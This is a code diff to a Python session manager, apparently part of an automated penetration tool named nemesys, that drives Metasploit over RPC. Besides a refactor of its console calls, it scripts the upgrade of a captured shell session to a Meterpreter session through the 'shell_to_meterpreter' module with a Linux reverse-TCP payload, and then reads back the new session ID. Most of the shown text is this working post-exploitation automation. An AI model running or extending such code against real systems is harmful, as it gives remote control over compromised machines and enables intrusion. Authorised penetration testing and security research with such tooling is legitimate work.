@@ -1,7 +1,6 @@
-from utils.logger import nemesysLogger
+from nemesys.utils.logger import nemesysLogger
 import re
 import time
-
 
 class SessionManager:
     """
@@ -27,7 +26,6 @@ class SessionManager:
         self.client = client
         self.session_timeout = session_timeout
         self.upgrade_timeout = upgrade_timeout
-
 
     def list_sessions(self):
         """Lists active sessions and their details."""
@@ -77,27 +75,25 @@ class SessionManager:
         console_id = self.client.consoles.console().cid
         exploit_module = 'multi/manage/shell_to_meterpreter'
         new_session_id = None
+        current_console = self.client.consoles.console(console_id)
 
         try:
             nemesysLogger.info("💉 [UPGRADE] Preparing session for upgrade...")
 
             # Configure the upgrade process
-            self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
-            self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
-            self.client.consoles.console(console_id).write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
-            self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
+            current_console.write(f'use {exploit_module}\n')
+            current_console.write(f'set SESSION {session_id}\n')
+            current_console.write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
+            current_console.write(f'set PLATFORM_OVERRIDE linux\n')
+            current_console.write(f'set PSH_ARCH_OVERRIDE x64\n')
 
             nemesysLogger.info(f"🔧 [UPGRADE] Running upgrade for session {session_id}...")
-            self.client.consoles.console(console_id).write('run\n')
+            current_console.write('run\n')
 
-            # Wait for the process to complete
-            nemesysLogger.debug(f"⏳ [UPGRADE] Waiting for {self.upgrade_timeout}s to finalize...")
             time.sleep(self.upgrade_timeout)
 
-            # Read the output of the upgrade attempt
-            output = self.client.consoles.console(console_id).read()
+            output = current_console.read()
             upgrade_output = output.get('data', '')
-
             # Check for the new Meterpreter session ID in the output
             if "Meterpreter session" in upgrade_output:
                 match = re.search(r'Meterpreter session (\d+) opened', upgrade_output)
@@ -118,6 +114,6 @@ class SessionManager:
 
         finally:
             # Clean up the console session
-            self.client.consoles.console(console_id).destroy()
+            current_console.destroy()
 
         return new_session_id
